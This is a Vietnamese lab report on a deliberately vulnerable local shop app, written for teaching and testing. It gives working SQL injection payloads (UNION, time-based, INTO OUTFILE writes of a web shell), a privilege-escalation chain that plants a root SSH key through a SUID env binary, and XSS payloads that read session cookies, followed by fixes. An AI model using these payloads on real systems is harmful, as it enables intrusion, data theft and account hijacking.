3. Chuyên Đề 1: Khai Thác Toàn Diện SQL Injection (SQLi)

1 3.1 Error-Based SQL Injection
Xác định cú pháp lỗi

Nguyên nhân kỹ thuật: Trong phương thức Product::findByIdVulnerable($id) tại models/Product.php, biến $id nhận từ người dùng qua phương thức GET được nối chuỗi trực tiếp vào câu lệnh SQL không qua bất kỳ cơ chế lọc hoặc Parameterized Query nào: 

$queryExecuted = "SELECT id, name, price, description FROM products WHERE id = " . $id;
$stmt = $db->query($queryExecuted);

Thao tác kiểm thử bằng Burp Suite / Trình duyệt:

Gửi ký tự nháy đơn ' vào tham số id:

GET /product?id=1' HTTP/1.1
Host: localhost:3000

Kết quả phản hồi trên giao diện Web: Khối thông báo lỗi cơ sở dữ liệu xuất hiện ngay trên trang:

[LỖI DATABASE]: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' at line 1

👉 Ý nghĩa: Thông báo lỗi trên cho phép khẳng định 100% hệ thống dính SQLi, xác định được DBMS phía sau là MariaDB/MySQL và vị trí lỗi xảy ra ở cuối câu lệnh. Điều này tạo tiền đề vững chắc cho việc xây dựng payload UNION ở bước tiếp theo.

2 3.2 In-Band UNION-based SQL Injection
Trích xuất cấu trúc dữ liệu

Xác định số cột bằng kỹ thuật ORDER BY: 

/product?id=1 ORDER BY 4-- -  →  HTTP 200 OK (Trang hiển thị bình thường)
/product?id=1 ORDER BY 5-- -  →  Lỗi: Unknown column '5' in 'order clause'

👉 Suy ra: Câu truy vấn gốc có chính xác 4 cột dữ liệu (id, name, price, description).

Trích xuất Tài khoản thực thi và Phiên bản máy chủ CSDL:

Để ép máy chủ bỏ qua dữ liệu thật của sản phẩm #1 và hiển thị dữ liệu giả lập từ mệnh đề UNION SELECT, ta đặt tham số id=-1:

GET /product?id=-1%20UNION%20SELECT%201,user(),3,@@version--%20- HTTP/1.1
Host: localhost:3000
Dữ liệu trích xuất hiển thị trực tiếp trên giao diện sản phẩm: - Mã sản phẩm (Cột 1): #1 - Tiêu đề sản phẩm (Cột 2): brewcart_user@% - Giá niêm yết (Cột 3): 3₫ - Đoạn mô tả (Cột 4): 10.11.16-MariaDB-1:10.11.16+maria~ubu2204
3 3.3 Chứng Minh Quyền Ghi File Trong Cơ Sở Dữ Liệu
Phân tích secure_file_priv & FILE Privilege

Để thực hiện ghi file tùy ý (Arbitrary File Write) lên máy chủ thông qua mệnh đề INTO OUTFILE, người kiểm thử cần chứng minh 2 điều kiện tiên quyết:

  1. Biến hệ thống secure_file_priv:
    ⚠️ Lưu ý kỹ thuật quan trọng về MariaDB / MySQL

    Khi máy chủ khởi động với cờ cấu hình --secure-file-priv="" (cho phép đọc/ghi file vào bất kỳ thư mục nào trên hệ điều hành), giá trị trả về của SELECT @@secure_file_priv; trong MariaDB là chuỗi rỗng "" hoặc NULL.

    Do đó, nếu học viên gửi lệnh -1 UNION SELECT 1,@@secure_file_priv,3,4-- - thì vị trí tiêu đề sản phẩm sẽ hiển thị NULL. Để ép hiển thị văn bản rõ ràng phục vụ chụp ảnh báo cáo, học viên có thể bọc hàm IFNULL: 

    GET /product?id=-1%20UNION%20SELECT%201,IFNULL(NULLIF(@@secure_file_priv,''),'RONG%20(FULL%20QUYEN%20GHI%20FILE)'),3,@@version--%20- HTTP/1.1
Host: localhost:3000
    👉 Kết quả: Tiêu đề sản phẩm in ra dòng chữ: RONG (FULL QUYEN GHI FILE).
  2. Kiểm tra đặc quyền FILE của User trong information_schema.user_privileges: 
    GET /product?id=-1%20UNION%20SELECT%201,GRANTEE,3,PRIVILEGE_TYPE%20FROM%20information_schema.user_privileges%20WHERE%20PRIVILEGE_TYPE='FILE'--%20- HTTP/1.1
Host: localhost:3000
    👉 Kết quả: Cột 2 hiển thị 'brewcart_user'@'%' và Cột 4 hiển thị chữ FILE → Minh chứng 100% CSDL có quyền đọc/ghi file hệ thống.
4 3.4 Tấn Công Arbitrary File Write (INTO OUTFILE)
Ghi file lên Web Server

Do thư mục /app/uploads được gắn kết chung (Volume Mount) giữa container mysql và thư mục web của container vulnerable-app tại /var/www/html/public/uploads, bất kỳ tệp tin nào do MariaDB tạo ra đều được Apache phục vụ trực tiếp qua giao thức HTTP.

Gửi Payload ghi file kiểm thử:

GET /product?id=-1%20UNION%20SELECT%201,'Xin%20chao%20thay%20va%20cac%20ban!',3,4%20INTO%20OUTFILE%20'/app/uploads/xin_chao.txt'--%20- HTTP/1.1
Host: localhost:3000

Giao diện phản hồi: Khối thông báo màu xanh lá xác nhận thành công xuất hiện:

[✅ THỰC THI THÀNH CÔNG] Mệnh đề INTO OUTFILE đã được máy chủ MariaDB thực thi thành công! Tệp tin đã sẵn sàng truy cập tại: http://localhost:3000/uploads/xin_chao.txt

Kiểm chứng kết quả bằng trình duyệt hoặc cURL:

curl -s http://localhost:3000/uploads/xin_chao.txt
1 Xin chao thay va cac ban! 3 4

👉 Tệp tin văn bản đã được tạo trên ổ cứng máy chủ và truy cập công khai 100%.

5 3.5 Chuỗi Khai Thác Toàn Diện: SQLi → Web Execution → SUID Env PrivEsc → Root SSH
Full Exploit Chain

Kịch bản thực chiến mô phỏng toàn bộ chuỗi tấn công hoàn chỉnh (Full Attack Lifecycle) từ việc phát hiện lỗ hổng trên tầng Web cho đến khi chiếm toàn quyền điều khiển máy chủ thông qua dịch vụ SSH Server (chuỗi workflow trong ssh_www.py):

Bước 1 — Xác nhận điểm tiêm SQL Injection:

Kiểm tra khả năng inject tham số tại /product?id=1', máy chủ MariaDB nhả lỗi cú pháp xác nhận điểm chèn hợp lệ.

Bước 2 — Khai thác SQLi INTO OUTFILE ghi tệp tin lên Web Server:

Lợi dụng đặc quyền FILE và cờ secure_file_priv="" của CSDL, kẻ tấn công dùng mệnh đề UNION SELECT để ghi tệp script vào thư mục web công khai /app/uploads/: 

GET /product?id=-1%20UNION%20SELECT%20'<script_code>','','',''%20INTO%20OUTFILE%20'/app/uploads/shell.php'--%20- HTTP/1.1
Host: localhost:3000

Bước 3 — Ngữ cảnh thực thi Web (www-data) & Rào cản bảo vệ:

Khi tệp tin được kích hoạt qua giao thức HTTP, tiến trình thực thi mang danh tính tài khoản dịch vụ mạng:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

👉 Rào cản an ninh: Tài khoản www-data bị hệ điều hành Linux chặn truy cập thư mục của quản trị viên (/root/.ssh/), không thể trực tiếp đọc tệp nhạy cảm hoặc ghi khóa xác thực SSH do bị giới hạn bởi quyền hạn tối thiểu (Discretionary Access Control).

Bước 4 — Leo thang đặc quyền cài đặt SSH Key qua SUID binary (/usr/bin/env):

Người kiểm thử rà soát các tệp tin có cờ SUID trên hệ thống (find / -perm -4000 2>/dev/null) và phát hiện tiện ích /usr/bin/env bị cấu hình sai mang cờ SetUID (-rwsr-xr-x): 

/usr/bin/env id  →  uid=33(www-data) euid=0(root)

Nhờ quyền hiệu dụng euid=0(root) từ SUID env, kẻ tấn công vượt qua rào cản phân quyền của www-data và nạp khóa công khai (Public Key) vào tệp xác thực của Root: 

/usr/bin/env install -D -m 600 /tmp/lab_key.pub /root/.ssh/authorized_keys

👉 Tệp /root/.ssh/authorized_keys được tạo lập thành công với chủ sở hữu là root:root và phân quyền chuẩn 0600.

Bước 5 — Chiếm quyền điều khiển Root Shell qua OpenSSH cổng 2022:

Kết nối trực tiếp vào máy chủ bằng Private Key tương ứng qua cổng SSH mở ngoài Host:

ssh -i lab_key -p 2022 root@localhost
root@vulnerable-app:~# whoami; id; hostname root uid=0(root) gid=0(root) groups=0(root) vulnerable-app

👉 Kẻ tấn công đạt được toàn quyền điều khiển máy chủ (Root Shell) ở mức đặc quyền cao nhất của hệ điều hành.

6 3.6 Time-based Blind SQL Injection
Trích xuất dữ liệu mù

Trên API truy vấn danh sách sản phẩm theo ID GET /api/store/products?id=..., ứng dụng trả về danh sách JSON. Khi câu truy vấn có điều kiện đúng kèm hàm SLEEP(), tiến trình MySQL sẽ hoãn lại phản hồi: 

curl -o /dev/null -s -w "Thời gian: %{time_total}s\n" "http://localhost:3000/api/store/products?id=1"
Thời gian: 0.02s

curl -o /dev/null -s -w "Thời gian: %{time_total}s\n" "http://localhost:3000/api/store/products?id=1%20AND%20SLEEP(1.5)"
Thời gian: 1.53s

👉 Độ trễ tăng vọt từ 0.02s lên 1.53s xác nhận kẻ tấn công có thể trích xuất từng bit dữ liệu (Boolean/Time Inference) ngay cả khi ứng dụng không nhả lỗi ra màn hình.

🛡️ 3.7 Biện Pháp Khắc Phục Triệt Để SQL Injection Remediation
1. Sử dụng Prepared Statements (Tham số hóa truy vấn với PDO)

Tuyệt đối không nối chuỗi biến người dùng vào câu SQL. Sử dụng liên kết tham số:

// Code an toàn:
$stmt = $db->prepare("SELECT id, name, price, description FROM products WHERE id = :id");
$stmt->execute([':id' => $id]);
$product = $stmt->fetch();
2. Thu hồi đặc quyền FILE & Cấu hình khóa secure_file_priv

Trong môi trường Production, tuân thủ nguyên tắc đặc quyền tối thiểu (Least Privilege):

-- Thu hồi quyền ghi file của tài khoản web:
REVOKE FILE ON *.* FROM 'brewcart_user'@'%';

-- Khóa biến secure_file_priv trong file cấu hình my.cnf:
[mysqld]
secure_file_priv = NULL   # Vô hiệu hóa hoàn toàn lệnh đọc ghi file ngoài DB

4. Chuyên Đề 2: Khai Thác Toàn Diện Cross-Site Scripting (XSS)

1 4.1 Stored XSS Trên Đánh Giá Sản Phẩm & Chiếm Session Cookie Admin
Stored XSS / Session Hijacking

Nguyên nhân kỹ thuật: Khi khách hàng gửi đánh giá sản phẩm tại POST /api/store/reviews, trường body được lưu nguyên vẹn vào CSDL trong bảng reviews. Tại trang quản trị duyệt đánh giá views/admin/reviews.php, nội dung được render trực tiếp vào HTML mà không qua hàm escape (htmlspecialchars): 

<!-- Code dính lỗi trong views/admin/reviews.php -->
<div class="rev-body"><?= $rev['body'] ?></div>

Đồng thời, trong controllers/AuthController.php, cookie xác thực phiên session_token được thiết lập không có cờ HttpOnly: 

setcookie('session_token', $token, [
    'httponly' => false  // ← Cho phép JavaScript trong trang truy cập document.cookie!
]);

Kịch bản tấn công đánh cắp Cookie:

  1. Đăng nhập tài khoản khách hàng huy@gmail.com và truy cập trang sản phẩm /product?id=1.
  2. Gửi nội dung đánh giá chứa payload XSS: 
    <img src=x onerror="alert('Cookie Admin bị lộ: ' + document.cookie)">
  3. Đăng xuất và đăng nhập tài khoản Quản trị viên admin@gmail.com.
  4. Truy cập trang Duyệt Đánh Giá tại: http://localhost:3000/admin/reviews.
  5. Hiện tượng: Hộp thoại alert ngay lập tức bật lên hiển thị giá trị session_token=admin-uuid-token.... Kẻ tấn công có thể thay thế lệnh alert bằng mã gửi cookie về server thu thập từ xa để chiếm quyền tài khoản quản trị vĩnh viễn.
2 4.2 Reflected XSS Trên Thanh Tìm Kiếm Sản Phẩm
Reflected XSS

Tại route tìm kiếm sản phẩm views/search/index.php, từ khóa tìm kiếm q được in trực tiếp vào kết quả tìm kiếm trên trang mà không được lọc ký tự đặc biệt HTML: 

<!-- Code dính lỗi trong views/search/index.php -->
<p>Kết quả tìm kiếm cho từ khóa: <strong><?= $q ?></strong></p>

Thao tác kiểm thử:

Gửi liên kết có chứa mã độc:

http://localhost:3000/search?q=<script>alert('Reflected_XSS_BrewCart')</script>

👉 Trình duyệt nạn nhân khi mở liên kết sẽ kích hoạt đoạn script độc hại ngay trong ngữ cảnh phiên làm việc của trang web.

3 4.3 Stored XSS Qua Unrestricted File Upload
MIME-type / Extension Bypass

Tại tính năng gửi file đính kèm hỗ trợ POST /api/member/support/tickets/1/attachments, hệ thống chỉ lưu file mà không kiểm tra phần mở rộng tệp (Extension Whitelisting). Đồng thời, máy chủ Apache được cấu hình sẵn chỉ thị: 

AddType text/html .html .shtml .xhtml
AddType image/svg+xml .svg .svgz

Thao tác kiểm thử:

Gửi request tải lên tệp tin HTML chứa payload XSS:

POST /api/member/support/tickets/1/attachments HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
    "filename": "xss_exploit.html",
    "content": "<html><body><h1>XSS Upload</h1><script>alert('Stored_XSS_Upload: ' + document.domain)</script></body></html>"
}

Máy chủ phản hồi đường dẫn tệp đính kèm: /uploads/xss_exploit.html. Khi nạn nhân click vào link, Apache phục vụ tệp với header Content-Type: text/html, khiến mã JavaScript thực thi ngay lập tức.

🛡️ 4.4 Biện Pháp Khắc Phục Triệt Để Cross-Site Scripting Remediation
1. Context-Aware Output Encoding (Mã hóa thực thể HTML)

Mọi biến hiển thị ra giao diện người dùng phải được đưa qua hàm mã hóa chuẩn:

<!-- Code an toàn: -->
<div class="rev-body"><?= htmlspecialchars($rev['body'], ENT_QUOTES | ENT_HTML5, 'UTF-8') ?></div>

6. Kịch Bản Kiểm Thử Tự Động & Thiết Kế Workflow Chuẩn Mực

Để đảm bảo tính khách quan và khoa học, toàn bộ các lỗ hổng và cơ chế phòng vệ trong hệ thống BrewCart đều được tự động hóa kiểm định thông qua script Python test_lab.py.

6.1 Thiết Kế Quy Trình Kiểm Thử Chuẩn Mực (Idempotent Verification Workflow) Kiến Trúc Tự Động Hóa

Trong quá trình xây dựng các kịch bản kiểm thử tự động hóa cho phòng lab an toàn thông tin, các script dạng "tấn công một lần" (Single-shot Exploit) thường gặp 2 lỗi nghiêm trọng khiến quy trình bị đứt gãy:

  • Lỗi xung đột tệp tin (File Collision): Mệnh đề INTO OUTFILE của MySQL/MariaDB sẽ từ chối ghi đè nếu tệp tin đích đã tồn tại (ERROR 1086: File already exists). Nếu script không có cơ chế dọn dẹp trước và sau khi chạy, nó sẽ bị lỗi ngay từ lần chạy thứ hai.
  • Lỗi phân quyền khóa bí mật trên Windows (Windows OpenSSH Key Permission): Các tệp private key sinh ra trên hệ điều hành Windows thường bị cấp quyền mặc định cho nhóm người dùng chung ("Users"), khiến OpenSSH client từ chối kết nối với thông báo lỗi "Permissions are too open". Việc chuyển sang xác thực khóa trong bộ nhớ RAM thông qua thư viện paramiko giúp script chạy tương thích 100% trên cả Windows, Linux và macOS.

7. Kết Luận & Khuyến Nghị

Bài thực nghiệm trên hệ thống BrewCart E-Commerce đã minh chứng sống động tác động nguy hiểm của 2 nhóm lỗ hổng kinh điển theo thang đo OWASP Top 10:

  • SQL Injection: Không chỉ dừng lại ở việc đọc trộm cấu trúc và phiên bản CSDL, sự kết hợp giữa lỗ hổng SQLi, cấu hình secure_file_priv="" và quyền FILE đã dẫn tới việc ghi tệp tin trực tiếp lên hệ điều hành và đạt được quyền thực thi mã từ xa (RCE) qua dịch vụ SSH Server.
  • Cross-Site Scripting (XSS): Lỗ hổng Stored XSS kết hợp với việc thiếu cờ bảo vệ HttpOnly trên Cookie phiên cho phép kẻ tấn công chiếm toàn quyền tài khoản quản trị viên chỉ với một payload đơn giản trong phần nhận xét sản phẩm.

Các giải pháp khắc phục triệt để nhất là: Áp dụng Prepared Statements (PDO) cho 100% truy vấn CSDL, HTML Entity Encoding cho toàn bộ dữ liệu đầu ra và bật cờ HttpOnly cho tất cả các cookie phiên xác thực.
